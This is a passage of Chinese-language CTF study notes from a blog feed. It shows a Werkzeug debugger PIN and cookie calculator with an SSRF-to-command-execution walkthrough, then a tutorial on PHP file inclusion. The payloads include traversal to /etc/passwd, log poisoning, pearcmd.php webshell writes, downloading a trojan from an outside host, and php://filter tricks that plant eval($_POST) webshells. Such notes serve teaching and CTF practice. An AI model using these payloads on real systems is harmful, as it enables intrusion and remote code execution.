class="hljs-string">&#x27;0402a7ff83cc48b41b227763d03b386cb5040585c82f3b99aa3ad120ae69ebaa&#x27;</span>  <span class="hljs-comment"># /etc/machine-id</span><br>]<br><br><span class="hljs-comment"># 下面为源码里面抄的，不需要修改</span><br>h = hashlib.md5()<br><span class="hljs-keyword">for</span> bit <span class="hljs-keyword">in</span> chain(probably_public_bits, private_bits):<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> bit:<br>        <span class="hljs-keyword">continue</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(bit, <span class="hljs-built_in">str</span>):<br>        bit = bit.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>    h.update(bit)<br>h.update(<span class="hljs-string">b&#x27;cookiesalt&#x27;</span>)<br><br>cookie_name = <span class="hljs-string">&#x27;__wzd&#x27;</span> + h.hexdigest()[:<span class="hljs-number">20</span>]<br><br>num = <span class="hljs-literal">None</span><br><span class="hljs-keyword">if</span> num <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>    h.update(<span class="hljs-string">b&#x27;pinsalt&#x27;</span>)<br>    num = (<span class="hljs-string">&#x27;%09d&#x27;</span> % <span class="hljs-built_in">int</span>(h.hexdigest(), <span class="hljs-number">16</span>))[:<span class="hljs-number">9</span>]<br><br>rv = <span class="hljs-literal">None</span><br><span class="hljs-keyword">if</span> rv <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>    <span class="hljs-keyword">for</span> group_size <span class="hljs-keyword">in</span> <span class="hljs-number">5</span>, <span class="hljs-number">4</span>, <span class="hljs-number">3</span>:<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(num) % group_size == <span class="hljs-number">0</span>:<br>            rv = <span class="hljs-string">&#x27;-&#x27;</span>.join(num[x:x + group_size].rjust(group_size, <span class="hljs-string">&#x27;0&#x27;</span>)<br>                          <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(num), group_size))<br>            <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">else</span>:<br>            rv = num<br><span class="hljs-built_in">print</span>(rv)<br>cookie = <span class="hljs-built_in">str</span>(<span class="hljs-built_in">int</span>(time.time())) + <span class="hljs-string">&quot;|&quot;</span> + hashlib.sha1(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;rv&#125;</span> added salt&quot;</span>.encode(<span class="hljs-string">&quot;utf-8&quot;</span>, <span class="hljs-string">&quot;replace&quot;</span>)).hexdigest()[:<span class="hljs-number">12</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;cookie为: <span class="hljs-subst">&#123;cookie_name&#125;</span>=<span class="hljs-subst">&#123;cookie&#125;</span>&quot;</span>)<br></code></pre></td></tr></table></figure><h3 id="pppythonnewstarctf-2023-week5"><a class="markdownIt-Anchor" href="#pppythonnewstarctf-2023-week5"></a> pppython?（NewStarCTF 2023 week5）</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;hint&#x27;</span>] == [<span class="hljs-string">&quot;your?&quot;</span>, <span class="hljs-string">&quot;mine!&quot;</span>, <span class="hljs-string">&quot;hint!!&quot;</span>])&#123;<br>        <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Content-type: text/plain&quot;</span>);<br>        <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;ls / -la&quot;</span>);<br>        <span class="hljs-keyword">exit</span>();<br>    &#125;<br>    <br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-variable">$ch</span> = <span class="hljs-title function_ invoke__">curl_init</span>();<br>        <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_URL, <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;url&#x27;</span>]);<br>        <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_CONNECTTIMEOUT, <span class="hljs-number">60</span>);<br>        <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_HTTPHEADER, <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;lolita&#x27;</span>]);<br>        <span class="hljs-variable">$output</span> = <span class="hljs-title function_ invoke__">curl_exec</span>(<span class="hljs-variable">$ch</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$output</span>;<br>        <span class="hljs-title function_ invoke__">curl_close</span>(<span class="hljs-variable">$ch</span>);   <br>    &#125;<span class="hljs-keyword">catch</span> (<span class="hljs-built_in">Error</span> <span class="hljs-variable">$x</span>)&#123;<br>        <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>        <span class="hljs-title function_ invoke__">highlight_string</span>(<span class="hljs-variable">$x</span>-&gt;<span class="hljs-title function_ invoke__">getMessage</span>());<br>    &#125;<br><br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><ul><li>先利用ssrf读取文件</li></ul><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">url=<span class="hljs-link">file:///etc/passwd&amp;lolita</span>[<span class="hljs-string"></span>]=<br></code></pre></td></tr></table></figure><ul><li><p>使用脚本计算pin码和cookie</p></li><li><p>ssrf验证pin码</p></li></ul><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-link">http://127.0.0.1:1314/console?__debugger__=yes&amp;cmd=pinauth&amp;pin=479-984-352&amp;s=S8pl4s2BFc3twTzNOy1j&amp;lolita</span>[<span class="hljs-string"></span>]=<br></code></pre></td></tr></table></figure><p>s是通过报错获得的<code>SECRET</code></p><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs actionscript"><span class="hljs-keyword">var</span> CONSOLE_MODE = <span class="hljs-literal">false</span>,<br>         EVALEX = <span class="hljs-literal">true</span>,<br>         EVALEX_TRUSTED = <span class="hljs-literal">false</span>,<br>         SECRET = <span class="hljs-string">&quot;S8pl4s2BFc3twTzNOy1j&quot;</span>;<br></code></pre></td></tr></table></figure><ul><li>ssrf命令执行</li></ul><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-link">http://localhost:1314/console?&amp;__debugger__=yes&amp;cmd=__import__(&quot;os&quot;).popen(&quot;cat$&#123;IFS&#125;$9flag&quot;).read()&amp;frm=0&amp;s=S8pl4s2BFc3twTzNOy1j&amp;lolita</span>[<span class="hljs-string"></span>]=__wzd6074dc98f8ebafc5ab76=1699333705|ff7b3a920e45<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>php文件包含</title>
    <link href="/2023/07/07/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
    <url>/2023/07/07/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</url>
    
    <content type="html"><![CDATA[<p>一个php文件包含另一个php文件，可以提升代码的复用性。</p><p>若包含不当会导致安全漏洞。</p><p>php常见的文件包含函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;a.php&#x27;</span><br><span class="hljs-keyword">include_once</span> <span class="hljs-string">&#x27;a.php&#x27;</span> <span class="hljs-comment">#只包含一次</span><br><span class="hljs-keyword">require</span> <span class="hljs-string">&#x27;a.php&#x27;</span><br><span class="hljs-keyword">require_once</span> <span class="hljs-string">&#x27;a.php&#x27;</span> <span class="hljs-comment">#只包含一次</span><br></code></pre></td></tr></table></figure><p><code>require</code> 包含文件遇到错误时，程序就不会继续往下执行了。</p><p><code>include</code>包含文件遇到错误时，程序还可以继续往下执行。读到不存在的目录仍然能路径穿越，<code>1?/../../flag</code></p><p>文件包含会先将文件的内容读出来，如果包含的文件内容是php代码则会解析成php，如果不是则原样输出，和文件的后缀名无关。</p><h2 id="php本地文件包含"><a class="markdownIt-Anchor" href="#php本地文件包含"></a> php本地文件包含</h2><p>直接指定服务器的文件进行包含</p><h3 id="无限制"><a class="markdownIt-Anchor" href="#无限制"></a> 无限制</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>]);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>可以通过绝对路径或者伪协议进行文件包含</p><h3 id="前面限制"><a class="markdownIt-Anchor" href="#前面限制"></a> 前面限制</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;/var/www/html&#x27;</span>.<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>]);<br>&gt;?<br></code></pre></td></tr></table></figure><p>只能利用路径穿越进行文件包含</p><p>利用<code>/etc/passwd</code>进行测试，有回显说明是无限制，无回显说明有限制，可以用<code>../../etc/passwd</code>进行路径穿越，确定根目录</p><p>有一道远程文件包含限制前缀为<code>https://www\.php\.net</code>,（HCERT CTF）</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br>  <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;url&#x27;</span>]) &amp;&amp; <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;@^https://www\.php\.net/@&#x27;</span>,<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;url&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$tmp</span> = <span class="hljs-title function_ invoke__">tmpfile</span>();<br>    <span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$tmp</span>, <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;url&#x27;</span>]));<br>    @<span class="hljs-keyword">include_once</span>(<span class="hljs-title function_ invoke__">stream_get_meta_data</span>(<span class="hljs-variable">$tmp</span>)[<span class="hljs-string">&#x27;uri&#x27;</span>]);<br>    <span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$tmp</span>);<br>  &#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);<br>  &#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>利用payload:<code>?f=flag.php&amp;url=https://www.php.net/cached.php?f=cached.php</code>(包含cached.php这个文件后进行文件读取)</p><h3 id="后面限制"><a class="markdownIt-Anchor" href="#后面限制"></a> 后面限制</h3><p>限制后缀名</p><p>可以使用伪协议中的<code>php://filter、phar://、zip://</code>来进行rce</p><h3 id="php-get-shell方式"><a class="markdownIt-Anchor" href="#php-get-shell方式"></a> php get-shell方式</h3><p>思路：将php代码植入主机中，再使php代码得到解析</p><h4 id="1利用文件上传"><a class="markdownIt-Anchor" href="#1利用文件上传"></a> 1.利用文件上传</h4><p>上传php代码,例如</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">phpinfo</span>();<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h4 id="2利用中间件日志文件"><a class="markdownIt-Anchor" href="#2利用中间件日志文件"></a> 2.利用中间件日志文件</h4><p>例如当请求</p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">http://127.0.0.1:8080/1.php?file=</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>();<span class="hljs-meta">?&gt;</span></span><br></code></pre></td></tr></table></figure><p>这个请求会保存在日志中，通过文件包含日志文件，则可解析植入的php代码</p><h4 id="3ssh日志文件包含"><a class="markdownIt-Anchor" href="#3ssh日志文件包含"></a> 3.ssh日志文件包含</h4><p>利用ssh协议去连接主机，例如</p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">ssh &#x27;</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>();<span class="hljs-meta">?&gt;</span></span><span class="language-xml">&#x27;@host</span><br></code></pre></td></tr></table></figure><p>代码将被当成用户名保存在<code>/var/log/auth.log</code>中，利用文件包含即可</p><h3 id="pearcmdphp"><a class="markdownIt-Anchor" href="#pearcmdphp"></a> pearcmd.php</h3><p>pecl是PHP中用于管理扩展而使用的命令行工具，而pear是pecl依赖的类库。在7.3及以前，pecl/pear是默认安装的；在7.4及以后，需要我们在编译PHP的时候指定<code>--with-pear</code>才会安装。</p><p>在Docker任意版本镜像中，pcel/pear都会被默认安装，安装的路径在<code>/usr/local/lib/php</code>。</p><p>利用条件：存在<code>pearcmd.php</code>,可以利用文件包含测试。</p><p>1.写文件getshell poc</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">?+config-create+<span class="hljs-regexp">/&amp;file=/u</span>sr<span class="hljs-regexp">/local/</span>lib<span class="hljs-regexp">/php/</span>pearcmd.php&amp;<span class="hljs-regexp">/&lt;?=phpinfo()?&gt;+/</span>tmp/hello.php<br></code></pre></td></tr></table></figure><p>再访问<code>/tmp/hello.php</code></p><p>2.下载文件 poc</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c"><span class="hljs-meta">&amp;&amp;+download+http:<span class="hljs-comment">//ip:port/shell.php</span></span><br></code></pre></td></tr></table></figure><p>将木马写好放在vps上，再利用pearcmd.php将文件下载到靶机getshell。</p><p><a href="https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html">https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html</a></p><p>文件包含被限制后缀时可以尝试pearcmd</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmake"><span class="hljs-keyword">include</span>($<span class="hljs-keyword">file</span>.<span class="hljs-string">&quot;.php&quot;</span>);<br></code></pre></td></tr></table></figure><p>条件：</p><ul><li>安装了pear</li><li>开启了register_argc_argv</li></ul><p>用bp发包，get 需要用短标签</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle"><span class="hljs-keyword">file</span>=pearcmd&amp;+config-create+<span class="hljs-regexp">/&lt;?=eval($_POST[1]);?&gt;+/</span>var<span class="hljs-regexp">/www/</span>html/evil.php<br></code></pre></td></tr></table></figure><p>访问/evil.php</p><p><a href="https://longlone.top/%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/register_argc_argv%E4%B8%8Einclude%20to%20RCE%E7%9A%84%E5%B7%A7%E5%A6%99%E7%BB%84%E5%90%88/">register_argc_argv与include to RCE的巧妙组合</a></p><h2 id="php远程文件包含"><a class="markdownIt-Anchor" href="#php远程文件包含"></a> php远程文件包含</h2><p>需要php.ini中配置<code>allow_url_include=On</code></p><h3 id="利用协议远程包含文件"><a class="markdownIt-Anchor" href="#利用协议远程包含文件"></a> 利用协议远程包含文件</h3><img src="/2023/07/07/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/1.jpg" class=""><p>被包含的文件需要放在有公网ip的主机上</p><p>可用的协议有<code>HTTP、FTP、SMB、Webdav</code>等</p><h2 id="漏洞攻击伪协议利用方法"><a class="markdownIt-Anchor" href="#漏洞攻击伪协议利用方法"></a> 漏洞攻击伪协议利用方法</h2><p>可以利用伪协议的函数:<code>include(),file_get_contens(),highlight_file(),file_exists()</code></p><h3 id="file"><a class="markdownIt-Anchor" href="#file"></a> file://</h3><p>file://用于访问本地文件系统,在CTF中通常用来读取本地文件的且不受<code>allow_url_fopen</code>与<code>allow_url_include</code>的影响</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;page&#x27;</span>]))<br>&#123;<br>    <span class="hljs-keyword">include</span> <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;page&#x27;</span>];<br>&#125;<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><code>file:// [文件的绝对路径和文件名]</code></p><p>example:<a href="http://localhost:37917/?page=file:///var/www/html/phpinfo.php">http://localhost:37917/?page=file:///var/www/html/phpinfo.php</a></p><h3 id="phpinput"><a class="markdownIt-Anchor" href="#phpinput"></a> php://input</h3><p>需要<code>allow_url_include=On</code></p><p>对于HTTP请求中<code>Content-Type:multipart/form-data</code>是无效的</p><p><code>php://input</code>是PHP的输入流，获取POST的所有数据(把要传的数据写在post中)</p><h3 id="data"><a class="markdownIt-Anchor" href="#data"></a> data://</h3><p>需<code>allow_url_include=On</code></p><p>传入数据的协议</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">data:<span class="hljs-regexp">//</span>text/plain,要传入的数据<br>data:<span class="hljs-regexp">//</span>text/plain;base64,要传入的数据ba64编码<br></code></pre></td></tr></table></figure><h3 id="phpfilter"><a class="markdownIt-Anchor" href="#phpfilter"></a> <strong>php://filter</strong></h3><p>需要开启<code>allow_url_fopen</code></p><p>对读到的文件内容进行处理</p><p>常见的过滤器</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs awk">php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/read=convert.base64-encode/</span>resource=index.php <span class="hljs-comment">#base64编码</span><br>php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/read=string.rot13/</span>resource=index.php<span class="hljs-comment">#rot13编码</span><br>php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/string.strip_tags/</span>resource=index.php<span class="hljs-comment">#从字符串中去除HTML和PHP标记</span><br>php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/string.toupper/</span>resource=index.php<span class="hljs-comment">#全部转大写</span><br>php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/read=string.tolower/</span>resource=index.php<span class="hljs-comment">#全部转小写</span><br>php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/read=convert.quoted-printable-encode/</span>resource=index.php<span class="hljs-comment">#将字符串转化为8bit字符串</span><br>php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/convert.iconv.utf-8.utf-7/</span>resource=index.php<span class="hljs-comment">#对字符从utf-8到utf-7转换</span><br></code></pre></td></tr></table></figure><p>除了用php:filter来读取文件还可以用来写入文件</p><p>以明文方式写入</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">php:<span class="hljs-regexp">//</span>filter/resource=test.txt&amp;txt=helloworld<br></code></pre></td></tr></table></figure><p>编码写入</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/write=convert.base64-encode/</span>resource=test.txt&amp;txt=helloworld<br></code></pre></td></tr></table></figure><h4 id="base64解码特点"><a class="markdownIt-Anchor" href="#base64解码特点"></a> base64解码特点</h4><p>base64编码中只包含64个可打印字符，而PHP在解码base64时，遇到不在其中的字符时，将会跳过这些字符，仅将合法字符组成一个新的字符串进行解码。</p><p>可以使用 php://filter/write=convert.base64-decode 来先解码去除base64中没有的字符，在编码得到新的字符。</p><h4 id="死亡exit绕过"><a class="markdownIt-Anchor" href="#死亡exit绕过"></a> 死亡exit绕过</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$content</span> = <span class="hljs-string">&#x27;&lt;?php exit; ?&gt;&#x27;</span>;<br><span class="hljs-variable">$content</span> .= <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;txt&#x27;</span>];<br><span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;filename&#x27;</span>], <span class="hljs-variable">$content</span>);<br></code></pre></td></tr></table></figure><p>写入的语句在执行前先执行了exit退出了。</p><h5 id="base64"><a class="markdownIt-Anchor" href="#base64"></a> base64</h5><p>通过php://filter的base64-decode来绕过</p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">filename=php://filter/write=convert.base64-decode/resource=shell.php</span><br><span class="language-xml">txt=aPD9waHAgZXZhbCgkX1BPU1RbMTFdKTs/Pg==  //</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-number">11</span>]);<span class="hljs-meta">?&gt;</span></span><br></code></pre></td></tr></table></figure><p>前面加一个<code>a</code>的原因：<code>phpexit</code>共7个字符，base64算法解码时是4个byte一组，所以给他增加1个<code>a</code>一共8个字符。<code>phpexita</code>被正常解码,后面传入的websehll也能够正常解码。</p><h5 id="rot13"><a class="markdownIt-Anchor" href="#rot13"></a> rot13</h5><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">filename=php://<span class="hljs-built_in">filter</span>/<span class="hljs-built_in">convert</span>.<span class="hljs-keyword">string</span>.rot13/resource=<span class="hljs-built_in">shell</span>.php<br>txt=<span class="hljs-meta">&lt;?</span>cuc cucvasb();<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h5 id="相邻两位反转"><a class="markdownIt-Anchor" href="#相邻两位反转"></a> 相邻两位反转</h5><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">122.114</span>.<span class="hljs-number">254.128</span>:<span class="hljs-number">28049</span><span class="hljs-regexp">/?file=php:/</span><span class="hljs-regexp">/filter/</span>convert.iconv.UCS-<span class="hljs-number">2</span>LE.UCS-<span class="hljs-number">2</span>BE|?&lt;hp phpipfn(o;)&gt;?/resource=shell.php&amp;contents=?&lt;hp pe@av(l_<span class="hljs-variable">$OPTS1</span>[<span class="hljs-number">32</span>]<span class="hljs-number">4</span>;)&gt;?<br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">iconv</span>(<span class="hljs-string">&quot;UCS-2LE&quot;</span>,<span class="hljs-string">&quot;UCS-2BE&quot;</span>,<span class="hljs-string">&#x27;&lt;?php @eval($_POST[1234]);?&gt;&#x27;</span>);<br><span class="hljs-comment">//?&lt;hp pe@av(l_$OPTS1[32]4;)&gt;?</span><br></code></pre></td></tr></table></figure><p><a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html">https://www.leavesongs.com/PENETRATION/php-filter-magic.html</a></p><p><a href="https://xiaolong22333.top/archives/114/">https://xiaolong22333.top/archives/114/</a></p><h4 id="filterchain绕过"><a class="markdownIt-Anchor" href="#filterchain绕过"></a> filterchain绕过</h4><p>（本地文件包含）无需可控文件</p><blockquote><p>原理</p><ul><li><p>利用本地已有的固定文件内容</p></li><li><p>convert.iconv 将数据从字符集 A 转换为字符集 B</p></li><li><p>基于PHP Base64 Filter 宽松的解析，通过编码再解码去除多余的不可见字符构造webshell</p></li></ul></blockquote><p>字符转换例子</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$url</span> = <span class="hljs-string">&quot;php://filter/convert.iconv.UTF-8%2fUTF-7/resource=data:,some&lt;&gt;text&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$url</span>);<br><span class="hljs-comment">#输入的是,some&lt;&gt;text</span><br><span class="hljs-comment">#转换后变成some+ADwAPg-text</span><br></code></pre></td></tr></table></figure><p>利用base64去除不可见字符例子</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$url</span> = <span class="hljs-string">&quot;php://filter/&quot;</span>;<br><span class="hljs-variable">$url</span> .= <span class="hljs-string">&quot;convert.iconv.UTF8.CSISO2022KR&quot;</span>;<br><span class="hljs-variable">$url</span> .= <span class="hljs-string">&quot;/resource=data://,aaaaaaaaaaaaaa&quot;</span>;     <span class="hljs-comment">//我们这里简单使用 `data://` 来模拟文件内容读取。</span><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$url</span>));<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">// hexdump:</span><br><span class="hljs-comment">// 00000000  73 74 72 69 6e 67 28 31  38 29 20 22 1b 24 29 43  |string(18) &quot;.$)C|</span><br><span class="hljs-comment">// 00000010  61 61 61 61 61 61 61 61  61 61 61 61 61 61 22 0a  |aaaaaaaaaaaaaa&quot;.|</span><br>C前面有一些不可见字符<br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$url</span> = <span class="hljs-string">&quot;php://filter/&quot;</span>;<br><span class="hljs-variable">$url</span> .= <span class="hljs-string">&quot;convert.iconv.UTF8.CSISO2022KR&quot;</span>;<br><span class="hljs-variable">$url</span>.=<span class="hljs-string">&quot;|convert.base64-decode|convert.base64-encode&quot;</span>; <span class="hljs-comment">#利用base64解码去除不可见字符再编码回到原来的字符</span><br><span class="hljs-variable">$url</span> .= <span class="hljs-string">&quot;/resource=data://,aaaaaaaaaaaaaa&quot;</span>;     <span class="hljs-comment">//我们这里简单使用 `data://` 来模拟文件内容读取。</span><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$url</span>));<br></code></pre></td></tr></table></figure><p>利用<a href="https://github.com/wupco/PHP_INCLUDE_TO_SHELL_CHAR_DICT/tree/main">https://github.com/wupco/PHP_INCLUDE_TO_SHELL_CHAR_DICT/tree/main</a> 